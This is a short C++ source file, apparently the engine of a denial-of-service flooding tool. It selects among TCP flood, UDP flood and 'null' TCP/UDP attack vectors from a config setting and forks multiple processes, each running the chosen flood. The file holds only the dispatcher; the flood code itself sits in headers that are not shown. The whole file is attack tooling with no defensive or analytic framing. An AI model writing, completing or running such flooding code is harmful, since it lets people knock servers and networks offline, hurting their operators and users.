#include "engine.h"
#include "tcp_flood.h"
#include "udp_flood.h"
#include "null_tcp.h"
#include "null_udp.h"

#include <memory>
#include <unistd.h>

engine::engine(std::shared_ptr<Config> config) {
    std::unique_ptr<Vector> flood{};
    switch(config->vec){
        case TCP_FLOOD:
            flood.reset(new tcp_flood(config));
            break;
        case UDP_FLOOD:
            flood.reset(new udp_flood(config));
            break;
        case NULL_TCP:
            flood.reset(new null_tcp(config));
            break;
        case NULL_UDP:
            flood.reset(new null_udp(config));
            break;
        default:
            fputs("[-] invalid Vector selected\n", stderr);
            exit(EXIT_FAILURE);
    }

    for(int i = 0; i < config->trds; ++i){
        if(fork())
            flood->run();
    }
}
